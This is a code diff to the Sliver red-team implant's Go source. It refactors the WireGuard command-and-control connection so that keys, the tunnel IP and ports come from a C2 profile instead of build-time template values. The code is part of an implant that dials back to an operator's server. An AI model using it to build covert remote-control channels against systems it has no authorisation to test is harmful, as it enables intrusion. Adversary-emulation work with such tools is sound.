@@ -29,7 +29,6 @@ import (
 	"fmt"
 	"io"
 	"net"
-	"strconv"
 	"strings"
 	"time"
 
@@ -37,6 +36,7 @@ import (
 	"log"
 	// {{end}}
 
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	"github.com/bishopfox/sliver/implant/sliver/netstack"
@@ -51,12 +51,6 @@ var (
 	serverTunIP = "100.64.0.1" // Don't let user configure this for now
 	tunnelNet   *netstack.Net
 	tunAddress  string
-
-	wgImplantPrivKey  = `{{.Config.WGImplantPrivKey}}`
-	wgServerPubKey    = `{{.Config.WGServerPubKey}}`
-	wgPeerTunIP       = `{{.Config.WGPeerTunIP}}`
-	wgKeyExchangePort = getWgKeyExchangePort()
-	wgTcpCommsPort    = getWgTcpCommsPort()
 
 	PingInterval = 2 * time.Minute
 )
@@ -152,9 +146,14 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 }
 
 // WGConnect - Get a wg connection or die trying
-func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
+func WGConnect(address string, profile *sliverpb.C2Profile) (net.Conn, *device.Device, error) {
 
-	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
+	port := uint16(profile.Port)
+	pub := profile.Credentials.ControlClientKey
+	priv := profile.Credentials.ControlServerCert
+	tunIP := profile.Domains[0] // There is only one domain in a Wireguard profile: the IP
+
+	_, dev, tNet, err := bringUpWGInterface(address, port, string(priv), string(pub), tunIP)
 	if err != nil {
 		return nil, nil, err
 	}
@@ -165,7 +164,7 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 	log.Printf("Initial wg connection. Attempting to connect to wg key exchange listener")
 	// {{end}}
 
-	keyExchangeConnection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgKeyExchangePort))
+	keyExchangeConnection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, profile.KeyExchangePort))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to wg key exchange listener: %v", err)
@@ -195,7 +194,7 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 		return nil, nil, err
 	}
 
-	connection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgTcpCommsPort))
+	connection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, profile.ControlPort))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to sliver listener: %v", err)
@@ -278,20 +277,4 @@ func doKeyExchange(conn net.Conn) (string, string, string) {
 	return stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String()
 }
 
-func getWgKeyExchangePort() int {
-	wgKeyExchangePort, err := strconv.Atoi(`{{.Config.WGKeyExchangePort}}`)
-	if err != nil {
-		return 1337
-	}
-	return wgKeyExchangePort
-}
-
-func getWgTcpCommsPort() int {
-	wgTcpCommsPort, err := strconv.Atoi(`{{.Config.WGTcpCommsPort}}`)
-	if err != nil {
-		return 8888
-	}
-	return wgTcpCommsPort
-}
-
-// {{end}} -WGc2Enabled
+// {{end}}
